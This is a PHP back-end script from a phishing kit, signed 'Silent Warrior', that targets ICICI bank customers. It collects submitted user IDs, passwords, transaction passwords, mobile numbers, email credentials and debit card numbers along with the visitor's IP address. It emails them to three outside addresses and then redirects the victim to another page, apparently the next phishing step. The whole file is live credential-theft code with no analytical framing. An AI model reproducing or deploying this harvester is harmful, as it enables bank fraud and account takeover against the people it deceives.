<?
$ip = getenv("REMOTE_ADDR");
$message .= "---Created By Silent Warrior---\n";
$message .= "User Id : ".$_POST['user']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Mobile Number: ".$_POST['mobile']."\n";
$message .= "Transaction Password: ".$_POST['transaction']."\n";
$message .= "Email id: ".$_POST['email']."\n";
$message .= "Email password: ".$_POST['passw']."\n";
$message .= "Debit Card No: ".$_POST['card']."\n";
$message .= "IP: ".$ip."\n";
$recipient = "ricksmithnig45@yahoo.co.jp, jameskumarpvtltd@gmail.com, anandshreepvtltd@gmail.com";
$subject = " IIIIIIIINDIA ICICI PERSONAL: ".$ip."\n";
$headers = "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers))
{header("Location: grid.html");
}
else
{echo "ERROR! Please go back and try again.";
}?>
